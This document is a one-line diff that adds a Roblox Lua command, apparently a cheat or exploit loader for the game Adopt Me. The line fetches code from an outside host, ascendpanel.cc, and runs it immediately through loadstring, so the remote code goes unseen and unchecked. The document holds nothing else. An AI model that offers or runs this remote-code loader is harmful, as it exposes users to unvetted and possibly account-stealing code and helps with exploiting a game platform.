@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://ascendpanel.cc/run/bodidGI8d1Z6XFECkblVDAKH31BCK9VS8KvxdoQq1sw/adopt-me"))()
